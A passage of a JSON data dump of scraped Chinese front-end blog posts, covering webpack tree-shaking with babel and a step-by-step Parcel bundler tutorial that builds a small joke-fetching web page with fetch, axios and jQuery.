a.Select;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003evar a = require('element-ui');\u003c/code\u003e 这个过程就会将所有组件都引入进来了。\u003c/p\u003e\n\u003cp\u003e所以 \u003ccode\u003ebabel-plugin-component\u003c/code\u003e就做了一件事，将 \u003ccode\u003eimport { Button, Select } from 'element-ui'\u003c/code\u003e 转换成了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport Button from \u003cspan class=\"hljs-string\"\u003e'element-ui/lib/button'\u003c/span\u003e\nimport Select from \u003cspan class=\"hljs-string\"\u003e'element-ui/lib/select'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即使转换成了 commonjs 规范，也只是引入自己这个组件的js，将引入量减少到最低。\u003c/p\u003e\n\u003cp\u003e所以我们会看到几乎所有的UI组件库的目录形式都是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e|-lib\n||--component1\n||--component2\n||--component3\n|-index.common.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eindex.common.js\u003c/code\u003e 给 \u003ccode\u003eimport element from 'element-ui'\u003c/code\u003e 这种形式调用全部组件。\u003c/p\u003e\n\u003cp\u003elib 下的各组件用于按需引用。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e这里解释了问题2\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e经常在各大UI组件引用的文档上会看到说明 \u003ccode\u003eimport { button } from 'xx-ui'\u003c/code\u003e 这样会引入所有组件内容，需要添加额外的 babel 配置，比如 \u003ccode\u003ebabel-plugin-component\u003c/code\u003e？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003etree-shaking\u003c/h3\u003e\n\u003cp\u003ewebpack2 开始引入 tree-shaking 技术，通过静态分析 es6 的语法，可以删除没有被使用的模块。他只对 es6 的模块有效，所以一旦 babel 将 es6 的模块转换成 commonjs，webpack2 将无法使用这项优化。所以要使用这项技术，我们只能使用 webpack 的模块处理，加上 babel 的es6转换能力（需要关闭模块转换）。\u003c/p\u003e\n\u003cp\u003e最方便的使用方法为修改babel的配置。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003euse: {\n     loader: \u003cspan class=\"hljs-string\"\u003e'babel-loader'\u003c/span\u003e,\n     options: {\n       presets: [[\u003cspan class=\"hljs-string\"\u003e'babel-preset-es2015'\u003c/span\u003e, {modules: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}]],\n     }\n   }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改最开始demo\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// webpack\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e path = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003eentry\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'./a.js'\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003eoutput\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: path.resolve(__dirname, \u003cspan class=\"hljs-string\"\u003e'dist'\u003c/span\u003e),\n    \u003cspan class=\"hljs-attr\"\u003efilename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'bundle.js'\u003c/span\u003e,\n  },\n  \u003cspan class=\"hljs-attr\"\u003emodule\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003erules\u003c/span\u003e: [\n      {\n        \u003cspan class=\"hljs-attr\"\u003etest\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/\\.js$/\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eexclude\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/(node_modules|bower_components)/\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003euse\u003c/span\u003e: {\n          \u003cspan class=\"hljs-attr\"\u003eloader\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'babel-loader'\u003c/span\u003e,\n          \u003cspan class=\"hljs-attr\"\u003eoptions\u003c/span\u003e: {\n            \u003cspan class=\"hljs-attr\"\u003epresets\u003c/span\u003e: [[\u003cspan class=\"hljs-string\"\u003e'babel-preset-es2015'\u003c/span\u003e, {\u003cspan class=\"hljs-attr\"\u003emodules\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e}]],\n          }\n        }\n      }\n    ]\n  }\n};\n\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\n\u003cspan class=\"hljs-comment\"\u003e// a.js\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e a \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./c'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'a.js'\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(a);\n\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\n\u003cspan class=\"hljs-comment\"\u003e// c.js\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e333\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e foo = \u003cspan class=\"hljs-number\"\u003e123\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e { foo };\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改的点在于增加了babel，并关闭其modules功能。然后在 c.js 中增加一个输出 \u003ccode\u003eexport { foo }\u003c/code\u003e，但是 a.js 中并不引用它。\u003c/p\u003e\n\u003cp\u003e最后在编译出的 js 中，c.js 模块如下:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\n\u003cspan class=\"hljs-string\"\u003e\"use strict\"\u003c/span\u003e;\n/* unused harmony \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e foo */\n/* harmony default \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e */ __webpack_exports__[\u003cspan class=\"hljs-string\"\u003e\"a\"\u003c/span\u003e] = (333);\n\nvar foo = 123;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003efoo 变量被标记为没有使用，在最后压缩时这段会被删除。\u003c/p\u003e\n\u003cp\u003e需要说明的是，即使在 引入模块时使用了 es6 ，但是引入的那个模块却是使用 commonjs 进行输出，这也无法使用tree-shaking。\u003c/p\u003e\n\u003cp\u003e而第三方库大多是遵循 commonjs 规范的，这也造成了引入第三方库无法减少不必要的引入。\u003c/p\u003e\n\u003cp\u003e所以对于未来来说第三方库要同时发布 commonjs 格式和 es6 格式的模块。es6 模块的入口由 package.json 的字段 module 指定。而 commonjs 则还是在 main 字段指定。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e这里解释了问题6\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e听说 es6 还有 \u003ccode\u003etree-shaking\u003c/code\u003e 功能，怎么才能使用这个功能？\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514972768.3846","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac403369"},"id":"5a38e100f265da4324809297","author":{"$oid":"5a4cc287fa7d97296c4556b6"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/19/1606e2f115943aae?w=1067\u0026h=205\u0026f=png\u0026s=59927","https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11c26ac60?w=532\u0026h=268\u0026f=png\u0026s=33612","https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11c3a1cbb?w=2018\u0026h=678\u0026f=png\u0026s=312344","https://user-gold-cdn.xitu.io/2017/12/19/1606e2f116495124?w=616\u0026h=183\u0026f=png\u0026s=27304","https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11db9a494?w=685\u0026h=440\u0026f=png\u0026s=54050","https://user-gold-cdn.xitu.io/2017/12/19/1606e2f118965045?w=689\u0026h=411\u0026f=png\u0026s=59704"],"screenShot":null}],"title":"从 webpack 到全面拥抱 Parcel #1 探索 Parcel","meta":{"likeCount":0},"tag":["Webpack","JavaScript"],"comment":[],"shortContent":"最近大家都在关注一个很流行的类似 webpack 的前端构建工具 Parcel。这个库刚出来没多久(好像截至目前十几天)，但是很受欢迎，看下图就知道。 介绍这个库之前，我们来说一下我个人觉得 webpack 的一些不好的地方（相对于 Parcel）。 需要写配置文件（webpa…","content":"\u003cp\u003e最近大家都在关注一个很流行的类似 \u003ca target=\"_blank\" href=\"https://www.rails365.net/groups/webpack\"\u003ewebpack\u003c/a\u003e 的前端构建工具 \u003ca target=\"_blank\" href=\"https://github.com/parcel-bundler/parcel\"\u003eParcel\u003c/a\u003e。这个库刚出来没多久(好像截至目前十几天)，但是很受欢迎，看下图就知道。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f115943aae?w=1067\u0026amp;h=205\u0026amp;f=png\u0026amp;s=59927\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e所以值得一探！\u003c/p\u003e\n\u003cp\u003e官方地址：https://parceljs.org/\u003c/p\u003e\n\u003cp\u003egithub 地址：https://github.com/parcel-bundler/parcel\u003c/p\u003e\n\u003cp\u003e介绍这个库之前，我们来说一下我个人觉得 \u003ca target=\"_blank\" href=\"https://www.rails365.net/groups/webpack\"\u003ewebpack\u003c/a\u003e 的一些不好的地方（相对于 Parcel）。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e需要写配置文件（webpack.config.js），可能每使用一个功能，比如加载图片或 css，都要添加配置，要维护配置文件，而 \u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 不需要。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e感觉编译或加载速度有些慢，特别是库多或项目复杂的时候，虽然有一些办法代码拆分的方法可以解决，比如 CommonsChunkPlugin 或 DLLPlugin 之类的，但这些方法有些复杂。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11c26ac60?w=532\u0026amp;h=268\u0026amp;f=png\u0026amp;s=33612\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e需要一定的时间去学习如何使用 webpack。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e而 \u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 有很多优点，可以不使用配置文件，也就是说你只管写代码，它会自动运行，很智能化，打个比方吧，比如在 webpack 中如果要处理 css，那得要安装和加载一个 css 的 loader，然后配置文件写上几行，可是 \u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 不需要，直接用就行。\u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 学习起来比较简单，基本上可以说 \"不用学习\"，只是使用就可以了。\u003c/p\u003e\n\u003cp\u003e除此之外，模块热替换和代码拆分的功能，\u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 也有，还有，如果要你用 \u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e 写一个 react 的运行环境，可能不需要配置任何内容，只要安装几个 react 的包就可以用起来了。\u003c/p\u003e\n\u003cp\u003e说了这么多，我还是要把官方对它的特性进行概括的图片放出来：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11c3a1cbb?w=2018\u0026amp;h=678\u0026amp;f=png\u0026amp;s=312344\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e下面我们要开始来体验 parcel 的神奇之处，请跟紧。(源码我放到 https://github.com/hfpp2012/hello-parcel）\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e1. 安装\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ npm install -g parcel-bundler\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后初始化一个项目。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ mkdir parcelapp\n$ npm init\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e2. 初体验\u003c/h2\u003e\n\u003cp\u003e新建 html 文件。（这个将会是 parcel 的入口文件）\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eindex.html\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elang\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003echarset\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"viewport\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"width=device-width,initial-scale=1.0\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehttp-equiv\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"X-UA-Compatible\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"ie=edge\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003eJoke Generator\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"wrap\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003eJoke\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh3\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"joke\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh3\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"copy\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"./index.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eindex.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econsole.log(\u003cspan class=\"hljs-string\"\u003e'Hello'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e运行编译命令。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ parcel index.html\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e注意：上面的 parcel 命令接的是 html 文件，它会读 html 文件的内容，找到 javascript 文件，进行自运处理，不用像 webpack 那样，还要指定 javascript 的入口文件啥的。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f116495124?w=616\u0026amp;h=183\u0026amp;f=png\u0026amp;s=27304\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e生成了 \u003ccode\u003edist\u003c/code\u003e 目录。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003edist\n├── index.html\n└── parcelapp.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e监听在 1234 端口，浏览器效果如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11db9a494?w=685\u0026amp;h=440\u0026amp;f=png\u0026amp;s=54050\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e3. CommonJS 模块语法\u003c/h2\u003e\n\u003cp\u003e新建 jokes.js 文件。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ejokes.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-attr\"\u003egetOne\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eresolve, reject\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n      \u003cspan class=\"hljs-comment\"\u003e// 这个 api 是公开的。\u003c/span\u003e\n      fetch(\u003cspan class=\"hljs-string\"\u003e'http://api.icndb.com/jokes/random'\u003c/span\u003e)\n        .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e =\u0026gt;\u003c/span\u003e res.json())\n        .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n          resolve(data.value.joke);\n        })\n    })\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eindex.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e jokes = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./jokes'\u003c/span\u003e);\n\njokes.getOne()\n  .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ejoke\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById(\u003cspan class=\"hljs-string\"\u003e'joke'\u003c/span\u003e).innerHTML = joke;\n  });\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f118965045?w=689\u0026amp;h=411\u0026amp;f=png\u0026amp;s=59704\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e4. ES6 模块语法\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003erequire\u003c/code\u003e 改成 \u003ccode\u003eimport\u003c/code\u003e，如下所示：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eindex.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// const jokes = require('./jokes');\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { jokes } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./jokes'\u003c/span\u003e;\n\njokes.getOne()\n  .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ejoke\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById(\u003cspan class=\"hljs-string\"\u003e'joke'\u003c/span\u003e).innerHTML = joke;\n  });\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003ejokes.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e jokes = {\n  \u003cspan class=\"hljs-attr\"\u003egetOne\u003c/span\u003e: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eresolve, reject\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n      fetch(\u003cspan class=\"hljs-string\"\u003e'http://api.icndb.com/jokes/random'\u003c/span\u003e)\n        .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eres\u003c/span\u003e =\u0026gt;\u003c/span\u003e res.json())\n        .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n          resolve(data.value.joke);\n        })\n    })\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e5. 使用 \u003ca target=\"_blank\" href=\"https://github.com/axios/axios\"\u003eaxios\u003c/a\u003e 代替 fetch\u003c/h2\u003e\n\u003cp\u003e这只是为了演示使用一些库。\u003c/p\u003e\n\u003cp\u003e首先安装 \u003ca target=\"_blank\" href=\"https://github.com/axios/axios\"\u003eaxios\u003c/a\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ npm install axios\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e注意，这里每安装一个库，都要重新运行 parcel index.html\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ejokes.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport axios from \u003cspan class=\"hljs-string\"\u003e'axios'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const jokes = {\n  getOne: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Promise((resolve, reject) =\u0026gt; {\n      axios.get(\u003cspan class=\"hljs-string\"\u003e'http://api.icndb.com/jokes/random'\u003c/span\u003e)\n        .then(res =\u0026gt; {\n          resolve(res.data.value.joke);\n        })\n    })\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e6. 使用 jquery 代替 getElementById\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ npm install jquery\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eindex.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { jokes } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'./jokes'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e $ \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'jquery'\u003c/span\u003e;\n\njokes.getOne()\n  .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ejoke\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-comment\"\u003e// document.getElementById('joke').innerHTML = joke;\u003c/span\u003e\n    $(\u003cspan class=\"hljs-string\"\u003e'#joke'\u003c/span\u003e).text(joke);\n  });\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e7. 导入 非 JavaScript 资源\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003ecopyright.txt\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eCopyright 2018\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eindex.js\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode 